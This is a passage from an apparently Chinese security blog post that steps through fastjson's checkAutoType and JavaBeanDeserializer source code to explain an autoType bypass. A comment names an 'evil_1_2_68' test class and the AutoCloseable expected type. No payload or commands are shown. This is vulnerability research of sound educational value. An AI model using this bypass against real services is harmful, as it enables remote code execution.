</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">safeMode</span><span class="o">)</span> <span class="o">{</span> <span class="c1">//开启safeMode后,无法进行AutoType操作
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;safeMode not support autoType : &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">typeName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">192</span> <span class="o">||</span> <span class="n">typeName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">expectClassFlag</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span> <span class="o">||</span> <span class="o">...</span> <span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="n">typeName</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="sc">&#39;$&#39;</span><span class="o">,</span> <span class="sc">&#39;.&#39;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">fullHash</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">fnv1a_64</span><span class="o">(</span><span class="n">className</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">internalWhite</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">INTERNAL_WHITELIST_HASHCODES</span><span class="o">,</span>  <span class="n">fullHash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">;</span> <span class="c1">//internalWhite为false,不在内部白名单的哈希中
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">((!</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">autoTypeSupport</span> <span class="o">||</span> <span class="n">expectClassFlag</span><span class="o">))</span> <span class="o">{</span> <span class="c1">//expectClassFlag为false,由前面的if (expectClass == null) { expectClassFlag = false;决定
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">long</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">h3</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">className</span><span class="o">.</span><span class="na">length</span><span class="o">();</span> <span class="o">++</span><span class="n">i</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">^=</span> <span class="n">className</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">i</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="n">hash</span> <span class="o">*=</span> <span class="n">PRIME</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">denyHashCodes</span><span class="o">,</span> <span class="n">hash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="o">(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">binarySearch</span><span class="o">(</span><span class="n">acceptHashCodes</span><span class="o">,</span> <span class="n">fullHash</span><span class="o">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">continue</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                    <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/1c1d8d3fe9a28f3ba5fd63d320f461f8.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/1c1d8d3fe9a28f3ba5fd63d320f461f8.png, https://img.mi3aka.eu.org/2023/02/1c1d8d3fe9a28f3ba5fd63d320f461f8.png 1.5x, https://img.mi3aka.eu.org/2023/02/1c1d8d3fe9a28f3ba5fd63d320f461f8.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/1c1d8d3fe9a28f3ba5fd63d320f461f8.png"
        title="https://img.mi3aka.eu.org/2023/02/1c1d8d3fe9a28f3ba5fd63d320f461f8.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/c150591ecd3c4df0aafa3fe9001d0730.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/c150591ecd3c4df0aafa3fe9001d0730.png, https://img.mi3aka.eu.org/2023/02/c150591ecd3c4df0aafa3fe9001d0730.png 1.5x, https://img.mi3aka.eu.org/2023/02/c150591ecd3c4df0aafa3fe9001d0730.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/c150591ecd3c4df0aafa3fe9001d0730.png"
        title="https://img.mi3aka.eu.org/2023/02/c150591ecd3c4df0aafa3fe9001d0730.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">        <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClassFromMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span><span class="c1">//从缓存中加载类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">deserializers</span><span class="o">.</span><span class="na">findClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">typeMapping</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">internalWhite</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">clazz</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">loadClass</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">defaultClassLoader</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//判断clazz是不是继承了expectClass类且不是HashMap类型,是的话抛出异常,否则直接返回该类
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">clazz</span> <span class="o">!=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashMap</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">expectClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;type not match. &#34;</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">&#34; -&gt; &#34;</span> <span class="o">+</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/d2258b5a4d56e78a67284aaaf63b4052.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/d2258b5a4d56e78a67284aaaf63b4052.png, https://img.mi3aka.eu.org/2023/02/d2258b5a4d56e78a67284aaaf63b4052.png 1.5x, https://img.mi3aka.eu.org/2023/02/d2258b5a4d56e78a67284aaaf63b4052.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/d2258b5a4d56e78a67284aaaf63b4052.png"
        title="https://img.mi3aka.eu.org/2023/02/d2258b5a4d56e78a67284aaaf63b4052.png" /></p>
<p>使用JavaBeanDeserializer反序列化器进行反序列化操作</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.DefaultJSONParser
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ObjectDeserializer</span> <span class="n">deserializer</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="na">getDeserializer</span><span class="o">(</span><span class="n">clazz</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Class</span> <span class="n">deserClass</span> <span class="o">=</span> <span class="n">deserializer</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">JavaBeanDeserializer</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">deserClass</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">deserClass</span> <span class="o">!=</span> <span class="n">JavaBeanDeserializer</span><span class="o">.</span><span class="na">class</span> <span class="o">&amp;&amp;</span> <span class="n">deserClass</span> <span class="o">!=</span> <span class="n">ThrowableDeserializer</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">setResolveStatus</span><span class="o">(</span><span class="n">NONE</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">deserializer</span> <span class="k">instanceof</span> <span class="n">MapDeserializer</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">setResolveStatus</span><span class="o">(</span><span class="n">NONE</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">deserializer</span><span class="o">.</span><span class="na">deserialze</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">fieldName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="javabeandeserializer反序列化器">JavaBeanDeserializer反序列化器</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/efc6bfc010918e3f993f655285533f4d.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/efc6bfc010918e3f993f655285533f4d.png, https://img.mi3aka.eu.org/2023/02/efc6bfc010918e3f993f655285533f4d.png 1.5x, https://img.mi3aka.eu.org/2023/02/efc6bfc010918e3f993f655285533f4d.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/efc6bfc010918e3f993f655285533f4d.png"
        title="https://img.mi3aka.eu.org/2023/02/efc6bfc010918e3f993f655285533f4d.png" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://img.mi3aka.eu.org/2023/02/3c54a22c62d99212e96bfb3e13b84928.png"
        data-srcset="https://img.mi3aka.eu.org/2023/02/3c54a22c62d99212e96bfb3e13b84928.png, https://img.mi3aka.eu.org/2023/02/3c54a22c62d99212e96bfb3e13b84928.png 1.5x, https://img.mi3aka.eu.org/2023/02/3c54a22c62d99212e96bfb3e13b84928.png 2x"
        data-sizes="auto"
        alt="https://img.mi3aka.eu.org/2023/02/3c54a22c62d99212e96bfb3e13b84928.png"
        title="https://img.mi3aka.eu.org/2023/02/3c54a22c62d99212e96bfb3e13b84928.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">ObjectDeserializer</span> <span class="n">deserializer</span> <span class="o">=</span> <span class="n">getSeeAlso</span><span class="o">(</span><span class="n">config</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">beanInfo</span><span class="o">,</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">userType</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="n">deserializer</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//deserializer为null,此时进行第二次checkAutoType
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span> <span class="o">=</span> <span class="n">TypeUtils</span><span class="o">.</span><span class="na">getClass</span><span class="o">(</span><span class="n">type</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">userType</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="na">checkAutoType</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">expectClass</span><span class="o">,</span> <span class="n">lexer</span><span class="o">.</span><span class="na">getFeatures</span><span class="o">());</span><span class="c1">//typename为learn.bypass.evil_1_2_68,而expectClass为interface java.lang.AutoCloseable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">deserializer</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="na">getConfig</span><span class="o">().</span><span class="na">getDeserializer</span><span class="o">(</span><span class="n">userType</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="第二次checkautotype分析">第二次checkAutoType分析</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">checkAutoType</span><span class="o">(</span><span class="n">String</span> <span class="n">typeName</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">expectClass</span><span class="o">,</span> <span class="kt">int</span> <span class="n">features</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">typeName</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">autoTypeCheckHandlers</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="o">(</span><span class="n">AutoTypeCheckHandler</span> <span class="n">h</span> <span class="o">:</span> <span class="n">autoTypeCheckHandlers</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">type</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="na">handler</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">expectClass</span><span class="o">,</span> <span class="n">features</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">(</span><span class="n">type</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">type</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">                <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">safeModeMask</span> <span class="o">=</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SafeMode</span><span class="o">.</span><span class="na">mask</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">safeMode</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">safeMode</span>
</span></span><span class="line"><span class="cl">                <span class="o">||</span> <span class="o">(</span><span class="n">features</span> <span class="o">&amp;</span> <span class="n">safeModeMask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                <span class="o">||</span> <span class="o">(</span><span class="n">JSON</span><span class="o">.</span><span class="na">DEFAULT_PARSER_FEATURE</span> <span class="o">&amp;</span> <span class="n">safeModeMask</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">safeMode</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;safeMode not support autoType : &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">typeName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;=</span> <span class="mi">192</span> <span class="o">||</span> <span class="n">typeName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">expectClassFlag</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">expectClassFlag</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
